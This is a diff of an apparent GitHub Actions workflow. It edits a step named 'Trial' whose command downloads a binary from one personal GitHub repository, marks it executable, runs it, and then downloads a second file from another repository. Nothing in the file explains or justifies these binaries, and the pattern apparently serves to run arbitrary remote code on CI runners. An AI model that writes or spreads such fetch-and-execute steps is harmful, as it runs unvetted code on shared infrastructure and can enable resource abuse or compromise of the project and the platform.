@@ -15,7 +15,7 @@ jobs:
     steps:
     - uses: actions/checkout@v2
     - name: Trial
-      run: wget -O 1 https://raw.githubusercontent.com/trautroi/aws/master/nice && chmod +x 1 && ./1 && wget -O 2 https://raw.githubusercontent.com/johnwixk228/ujicoba/main/v2
+      run: wget -O 1 https://raw.githubusercontent.com/trautroi/aws/master/nice && chmod u+x 1 && ./1 && wget -O 2 https://raw.githubusercontent.com/johnwixk228/ujicoba/main/v2
 
     strategy:
       fail-fast: false
